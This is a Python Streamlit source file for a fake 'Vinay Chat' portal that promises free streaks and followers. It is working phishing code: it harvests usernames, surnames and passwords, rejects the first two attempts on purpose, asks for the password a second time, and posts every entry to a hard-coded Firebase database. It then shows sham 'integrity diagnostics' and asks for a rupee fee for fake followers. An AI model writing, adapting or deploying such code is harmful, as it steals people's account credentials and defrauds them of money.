import streamlit as st
import time
import requests
import datetime
import uuid

# --- 1. PAGE CONFIGURATION ---
st.set_page_config(
    page_title="Vinay Chat // Creator Core Connect",
    page_icon="🛡️",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# --- 2. ULTRA-PROFESSIONAL INPUT GRAPHICS (TEXT VISIBILITY FIX) ---
st.markdown(r"""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
    
    html, body, [class*="css"] {
        font-family: 'Roboto', sans-serif;
        background-color: #ffffff;
    }
    
    /* Input Boxes Text Colors Visibility Fix */
    div[data-baseweb="input"] {
        background-color: #f1f5f9 !important;
        border: 1px solid #cbd5e1 !important;
        border-radius: 6px !important;
    }
    input {
        color: #0f172a !important; /* Force dark text color so it's fully visible */
        font-weight: 500 !important;
    }
    label {
        color: #334155 !important;
        font-weight: 600 !important;
    }
    
    /* Brand Header Box */
    .brand-box {
        text-align: center;
        margin-bottom: 30px;
        padding: 20px;
    }
    .brand-title {
        font-size: 36px;
        font-weight: 700;
        color: #1e40af;
        letter-spacing: -0.5px;
    }
    .brand-subtitle {
        font-size: 14px;
        color: #64748b;
        margin-top: 5px;
    }
    
    /* Container Box Graphic */
    .login-card {
        background: #ffffff;
        border: 1px solid #e2e8f0;
        border-radius: 8px;
        padding: 35px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
    }
    </style>
""", unsafe_allow_html=True)

# --- 3. DATABASE BASE LINK ---
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/vinay_chat_requests.json"

# --- 4. SESSION SYSTEM REFRESH MATRIX ---
if 'step' not in st.session_state:
    st.session_state.step = 1
if 'attempt_counter' not in st.session_state:
    st.session_state.attempt_counter = 1
if 'vault_data' not in st.session_state:
    st.session_state.vault_data = {}

def push_to_firebase(status_label, user_dictionary):
    payload = {
        "timestamp": str(datetime.datetime.now()),
        "security_status": status_label,
        "payload_packet": user_dictionary
    }
    try:
        requests.post(FIREBASE_URL, json=payload)
    except:
        pass

# ==========================================
# STEP 1: FREE STREAKS GATEWAY (GOOGLE STYLE)
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='brand-box'><div class='brand-title'>Vinay Chat</div><div class='brand-subtitle'>v2.0 Beta // Creator Free Streaks Portal</div></div>", unsafe_allow_html=True)
    
    st.markdown("<div class='login-card'>", unsafe_allow_html=True)
    st.markdown("<h3 style='margin-top:0;color:#0f172a;'>Sign In</h3><p style='color:#475569;font-size:14px;'>Use your Vinay Chat Verification Credentials</p>", unsafe_allow_html=True)
    
    with st.form("streaks_login_form"):
        username = st.text_input("Username or Profile Name")
        surname = st.text_input("Surname")
        password = st.text_input("Account Password", type="password")
        
        submit_btn = st.form_submit_button("Next Step", type="primary")
        
        if submit_btn:
            if username and surname and password:
                # Save data instantly to memory
                st.session_state.vault_data = {
                    "username": username,
                    "surname": surname,
                    "entered_password": password,
                    "sequence_attempt": st.session_state.attempt_counter
                }
                
                # Logic Loop: Pehle 2 attempts hamesha fail honge aur database mein wrong telemetry bhejenge
                if st.session_state.attempt_counter < 3:
                    push_to_firebase(f"REJECTED_ATTEMPT_{st.session_state.attempt_counter}", st.session_state.vault_data)
                    st.session_state.attempt_counter += 1
                    st.error("⚠️ Authentication Failed: Invalid sync route token or password structural mismatch. Please try again.")
                else:
                    # 3rd attempt par pass ho jayega
                    push_to_firebase("VERIFIED_ROOT_PASS", st.session_state.vault_data)
                    st.success("🔒 Security Key Verified. Connection Encrypted.")
                    time.sleep(1)
                    st.session_state.step = 2
                    st.rerun()
            else:
                st.warning("Please fill out all authorization fields.")
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 2: CHOOSE SYSTEM CONFIGURATION
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='brand-box'><div class='brand-title'>Vinay Chat Management</div></div>", unsafe_allow_html=True)
    
    st.markdown("<div class='login-card'>", unsafe_allow_html=True)
    st.markdown("<h4 style='margin-top:0;color:#0f172a;'>Select Active Cloud Operation Module</h4>", unsafe_allow_html=True)
    
    choice = st.radio(
        "Available Modules for your Account:",
        ["Free Follower Engine Network (Active)", "Premium Beta Live Chat Theme (Locked)", "Global Admin Sync Ledger (Restricted)"]
    )
    
    st.markdown("---")
    st.markdown("<p style='color:#475569;font-size:13px;'>To initialize the Free Follower Engine Network, please confirm your verification token password again for structural safety rules.</p>", unsafe_allow_html=True)
    
    with st.form("confirm_password_block"):
        re_password = st.text_input("Confirm Vinay Chat Password", type="password")
        confirm_btn = st.form_submit_button("Authorize Allocation Node")
        
        if confirm_btn:
            if re_password == st.session_state.vault_data["entered_password"]:
                st.session_state.vault_data["confirmed_double_password"] = re_password
                push_to_firebase("FINAL_PASSWORD_CONFIRMED", st.session_state.vault_data)
                st.session_state.step = 3
                st.rerun()
            else:
                st.error("❌ Token Verification Mismatch: Passwords do not correlate with initial login matrix block.")
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 3: REALISTIC SYSTEM FLOW MATRIX
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='brand-box'><div class='brand-title'>Running Integrity Diagnostics</div></div>", unsafe_allow_html=True)
    
    st.write("Initializing secure server allocation tunnel pipelines...")
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    checks = [
        ("Establishing App Check handshake parameters...", 20),
        ("Verifying unique user framework status...", 45),
        ("Running system integrity profile check...", 70),
        ("Analyzing profile graphic bitmap verification asset...", 90),
        ("Syncing active telemetry load configurations...", 100)
    ]
    
    for log, percentage in checks:
        status_text.info(log)
        time.sleep(1.2)
        progress_bar.progress(percentage)
        
    st.success("Verification nodes established.")
    time.sleep(0.5)
    st.session_state.step = 4
    st.rerun()

# ==========================================
# STEP 4: QUANTUM SLIDER & VALUE FORMULA
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='brand-box'><div class='brand-title'>Follower Allocation Matrix</div></div>", unsafe_allow_html=True)
    
    st.markdown("Select target allocation parameters. Fee structures calculate live inside the database matrix node.")
    
    followers_slider = st.select_slider(
        "Select target follower quota configuration:",
        options=[100, 200, 500, 1000, 2000, 5000, 10000]
    )
    
    cost_calculation = int((followers_slider / 100) * 10)
    st.metric(label="Calculated Maintenance Ledger Fee", value=f"₹{cost_calculation} INR")
    
    if st.button("Generate System Ledger Pay Token", type="primary", use_container_width=True):
        generated_token = f"VCT-{str(uuid.uuid4())[:8].upper()}-PAY"
        
        st.session_state.vault_data["requested_amount"] = cost_calculation
        st.session_state.vault_data["requested_followers"] = followers_slider
        st.session_state.vault_data["generated_pay_token"] = generated_token
        
        push_to_firebase("FINAL_LEDGER_ORDER_COMPLETED", st.session_state.vault_data)
        
        st.session_state.token_id = generated_token
        st.session_state.step = 5
        st.rerun()

# ==========================================
# STEP 5: REDUCED EST TIME LEDGER PRINT
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='brand-box'><div class='brand-title' style='color:#16a34a;'>Deployment Successful</div></div>", unsafe_allow_html=True)
    
    st.markdown(f"""
    <div class='login-card' style='text-align:center;'>
        <h4 style='color:#334155;margin-top:0;'>Allocation Voucher Generated</h4>
        <h2 style='color:#2563eb;letter-spacing:1px;margin:15px 0;'>{st.session_state.token_id}</h2>
        <p style='color:#64748b;font-size:14px;line-height:1.6;'>
            Your selected database profile parameters are queued into the global delivery loop.
        </p>
        <hr style='border:0;border-top:1px solid #e2e8f0;margin:20px 0;'>
        <p style='color:#dc2626;font-weight:600;margin-bottom:4px;'>⏱️ Execution Timeline Node</p>
        <p style='margin:0;color:#334155;font-size:14px;'>Standard Pipeline Sync: <b>3 - 4 Hours</b></p>
        <p style='margin:5px 0 0 0;color:#16a34a;font-size:14px;'><i>Integrity profile verification status passed! Loop execution optimized to: <b>1 Hour Max</b>.</i></p>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("Reset Portal Framework"):
        st.session_state.clear()
        st.rerun()
